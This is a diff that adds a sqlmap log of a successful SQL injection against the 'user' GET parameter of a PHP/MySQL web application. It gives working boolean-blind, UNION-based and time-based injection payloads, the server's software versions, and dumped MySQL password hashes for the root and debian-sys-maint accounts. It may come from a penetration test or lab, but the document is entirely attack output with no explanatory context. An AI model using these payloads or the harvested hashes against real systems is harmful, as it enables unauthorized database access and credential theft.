@@ -1,0 +1,25 @@
+sqlmap identified the following injection points with a total of 55 HTTP(s) requests:
+---
+Place: GET
+Parameter: user
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=root' AND 3830=3830 AND 'altX'='altX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 16 columns
+    Payload: user=root' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a6b7971,0x495a6f47577a77784262,0x716c656171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: user=root' AND SLEEP(5) AND 'BIyk'='BIyk
+---
+web server operating system: Linux Ubuntu 12.04 (Precise Pangolin)
+web application technology: Apache 2.2.22, PHP 5.3.10
+back-end DBMS: MySQL 5.0.11
+database management system users password hashes:
+[*] debian-sys-maint [1]:
+    password hash: *69536D285FC82909E99A0DE27CCE48B45B8F8D14
+[*] root [1]:
+    password hash: *E2C9CB34ED118E5012AC3A676F782CC2BCD676AD
+
